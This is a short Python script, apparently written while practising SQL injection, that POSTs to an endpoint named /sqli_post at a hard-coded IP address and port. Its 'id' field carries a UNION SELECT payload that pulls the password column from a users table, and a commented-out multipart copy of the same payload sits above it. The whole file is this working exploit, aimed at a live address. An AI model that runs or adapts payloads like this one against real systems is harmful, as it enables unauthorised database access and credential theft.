'''
Description: 
Autor: Yue
Date: 2024-09-21 11:41:23
LastEditors: Yue
LastEditTime: 2024-09-21 12:06:34
'''
import requests

boundary1 = "----WebKitFormBoundaryIABEqlYAQTic2F4P"
headers = {
 'Host': '101.91.208.121:9001',
 # 'Content-Length': '64',
 'Cache-Control': 'max-age=0',
 'Upgrade-Insecure-Requests': '1',
 'Origin': 'http://101.91.208.121:9001',
 'Content-Type': 'application/x-www-form-urlencoded',
#  'Content-Type': f'multipart/form-data; boundary={boundary1}',
 'Content-Type': 'text/plain',
#   'Content-Type': 'application/x-www-form-urlencoded',
#  'Content-Type': 'multipart/form-data;',
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)'
'Chrome/123.0.0.0 Safari/537.36',
 'Accept':
'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/sig'
'ned-exchange;v=b3;q=0.7',
 'Referer': 'http://101.91.208.121:9001/',
 # 'Accept-Encoding': 'gzip, deflate, br',
 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7',
 'Connection': 'close',
}

# data = f"""
# --{boundary1}
# Content-Disposition: form-data; name="id"

# 1 UNION SELECT null, password FROM users WHERE id = 1 --
# --{boundary1}
# """

files = {
 'id': '1 UNION SELECT null, password FROM users WHERE id = 1 -- '
}
response = requests.post('http://101.91.208.121:9001/sqli_post', headers=headers, data=files, verify=False)
print(response)